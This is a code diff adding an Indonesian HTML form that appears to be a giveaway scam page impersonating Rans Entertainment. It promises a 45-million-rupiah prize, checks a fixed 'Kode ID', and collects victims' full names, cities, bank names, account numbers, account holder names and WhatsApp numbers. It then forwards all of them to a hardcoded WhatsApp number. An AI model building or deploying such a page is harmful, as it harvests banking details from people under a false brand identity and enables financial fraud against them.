@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Input Redirect WA</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            width: 100%;
+            height: 200px; /* Tinggi header */
+            background-image: url('your-background-image.jpg'); /* Ganti dengan gambar background yang diinginkan */
+            background-size: cover; /* Pastikan gambar menutupi seluruh area */
+            background-position: center; /* Pusatkan gambar */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgb(15, 163, 255);
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        header h1 {
+            margin: 0;
+            font-size: 36px;
+            text-align: center;
+        }
+        .title-img {
+            width: 200px; /* Ukuran gambar judul */
+            margin-bottom: 20px;
+        }
+        .form-container {
+            max-width: 500px;
+            margin: 20px auto;
+            background: rgb(10, 190, 255);
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-container input, .form-container select, .form-container button {
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .form-container input.error {
+            border-color: red;
+        }
+        .form-container .info-text {
+            font-size: 12px;
+            color: green;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .form-container button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .form-container button img {
+            width: 20px;
+            margin-right: 10px;
+        }
+        .form-container button:hover {
+            background-color: #20b855;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header dengan Background Gambar dan Judul -->
+    <header>
+        <img src="RANS.png" alt="Judul" class="title-img"> <!-- Ganti dengan gambar judul -->
+        <h1>FORM PENCAIRAN HADIAH</h1>
+    </header>
+
+    <!-- Kontainer Form -->
+    <div class="form-container">
+        <form id="form-data">
+            <input type="text" id="kode_id" placeholder="Kode ID" required>
+            <input type="text" id="nama_lengkap" placeholder="Nama Lengkap" required>
+            <input type="text" id="kota_provinsi" placeholder="Kota/Provinsi" required>
+            <select id="jenis_rekening" required>
+                <option value="" disabled selected>Jenis Rekening Bank</option>
+                <option value="BRI">BRI</option>
+                <option value="BCA">BCA</option>
+                <option value="BNI">BNI</option>
+                <option value="Mandiri">Mandiri</option>
+            </select>
+            <input type="number" id="nomor_rekening" placeholder="Nomor Rekening (hanya angka)" required>
+            <input type="text" id="nama_pemilik" placeholder="Nama Pemilik Rekening" required>
+            <input type="text" id="nomor_whatsapp" placeholder="Nomor WhatsApp (hanya angka)" required>
+            
+            <p class="info-text">
+                Kirimkan Formulir anda ini tadi ke WhatsApp Rans Entertainment, dengan cara klik tombol di bawah ini
+            </p>
+            
+            <button type="button" onclick="redirectToWhatsApp()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+                Kirim ke WhatsApp
+            </button>
+        </form>
+    </div>
+
+    <script>
+        function showModal(title, message) {
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-message').innerText = message;
+            document.getElementById('modal').style.display = 'block';
+        }
+
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+        }
+
+        function validateKodeID(kodeID) {
+            const validKodeID = "RANS8673";
+            if (kodeID !== validKodeID) {
+                const kodeInput = document.getElementById('kode_id');
+                kodeInput.classList.add('error');
+                showModal("Kode Tidak Ditemukan", "Masukkan kode ID yang valid.");
+                return false;
+            }
+            document.getElementById('kode_id').classList.remove('error');
+            return true;
+        }
+
+        function validateNomorRekening(jenisRekening, nomorRekening) {
+            const digitValid = {
+                BRI: 15,
+                BCA: 10,
+                BNI: 10,
+                Mandiri: 13
+            };
+
+            const validDigit = digitValid[jenisRekening];
+            if (nomorRekening.length !== validDigit) {
+                showModal("NOMOR REKENING YANG ANDA MASUKKAN TIDAK VALID", "Masukkan nomor rekening yang valid.");
+                return false;
+            }
+            return true;
+        }
+
+        function redirectToWhatsApp() {
+            const kodeID = document.getElementById('kode_id').value;
+            const namaLengkap = document.getElementById('nama_lengkap').value;
+            const kotaProvinsi = document.getElementById('kota_provinsi').value;
+            const jenisRekening = document.getElementById('jenis_rekening').value;
+            const nomorRekening = document.getElementById('nomor_rekening').value;
+            const namaPemilik = document.getElementById('nama_pemilik').value;
+            const nomorWhatsApp = document.getElementById('nomor_whatsapp').value;
+
+            if (!validateKodeID(kodeID)) return;
+            if (!validateNomorRekening(jenisRekening, nomorRekening)) return;
+
+            const pesan = `HALLO RANS, SAYA ${namaLengkap} TELAH MEMENANGKAN GIVEAWAY 45JT, BERIKUT ADALAH DATA DIRI SAYA:%0A` +
+                `*Kode ID:* ${kodeID}%0A` +
+                `*Nama Lengkap:* ${namaLengkap}%0A` +
+                `*Kota/Provinsi:* ${kotaProvinsi}%0A` +
+                `*Jenis Rekening Bank:* ${jenisRekening}%0A` +
+                `*Nomor Rekening:* ${nomorRekening}%0A` +
+                `*Nama Pemilik Rekening:* ${namaPemilik}%0A` +
+                `*Nomor WhatsApp:* ${nomorWhatsApp}`;
+
+            const url = `https://wa.me/6285855536927?text=${pesan}`;
+            window.open(url, '_blank');
+        }
+    </script>
+</body>
+</html>
